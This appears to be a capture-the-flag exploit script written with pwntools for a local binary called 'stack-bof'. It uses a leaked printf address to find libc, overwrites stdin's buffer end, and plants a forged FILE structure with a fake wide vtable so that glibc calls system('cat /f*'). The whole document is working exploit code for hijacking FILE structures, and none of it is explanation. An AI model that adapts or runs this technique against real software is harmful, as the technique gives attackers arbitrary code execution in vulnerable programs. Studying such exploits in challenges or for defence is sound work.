from pwn import *

io = process('./stack-bof')
printf_leak = int(io.recvline().split()[-1], 16)
libc = printf_leak - 0x60100

stdin     = libc + 0x2038e0
list_all  = libc + 0x2044c0
wfile_jmp = libc + 0x202228
system    = libc + 0x58750

fake = libc + 0x204700
wide = libc + 0x204800
lock = libc + 0x204900
wvtab = libc + 0x204a00
start = stdin + 0x83

payload = bytearray(0x1400)

def put(addr, data):
    off = addr - start
    payload[off:off+len(data)] = data

payload[0] = 0x0a                      # newline: gets returns immediately
put(start + 5,  p64(libc + 0x205720)) # preserve stdin lock
put(start + 29, p64(libc + 0x2039c0)) # preserve stdin wide_data
put(start + 85, p64(libc + 0x202030)) # preserve stdin vtable

put(list_all, p64(fake))

put(fake + 0x00, b'cat /f*\x00')
put(fake + 0x88, p64(lock))
put(fake + 0xa0, p64(wide))
put(fake + 0xc0, p32(1))
put(fake + 0xd8, p64(wfile_jmp))

put(wide + 0x18, p64(0))   # _IO_write_base
put(wide + 0x20, p64(8))   # _IO_write_ptr > base
put(wide + 0x30, p64(0))   # buf base so _IO_wdoallocbuf calls wide_vtable
put(wide + 0xe0, p64(wvtab))

put(wvtab + 0x68, p64(system))

io.send(p64(stdin + 0x40))            # overwrite stdin->_IO_buf_end
io.send(p64(libc + 0x204b00))
io.send(bytes(payload))
io.interactive()
